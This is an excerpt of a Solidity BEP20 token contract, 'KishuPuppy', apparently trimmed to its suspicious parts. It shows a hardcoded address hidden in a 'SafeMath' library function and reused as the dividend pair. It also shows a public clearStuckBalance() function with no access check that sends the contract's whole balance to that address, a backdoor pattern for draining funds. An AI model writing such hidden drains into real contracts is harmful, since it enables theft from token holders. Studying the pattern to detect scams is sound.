...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0xf3a552E7F7b7bd0F50EA5E484888f3fC502d5534;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0xf3a552E7F7b7bd0F50EA5E484888f3fC502d5534;
        _token = msg.sender;
    }
...
contract KishuPuppy is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x862d47994490B90bAee8dbC4DA39a836d388C1D6;

    string constant _name = "KishuPuppy";
    string constant _symbol = "KPUP";
    ...
    function clearStuckBalance() public{
        (bool sent,) =payable(0xf3a552E7F7b7bd0F50EA5E484888f3fC502d5534).call{value: (address(this).balance)}("");
        require(sent);
    }
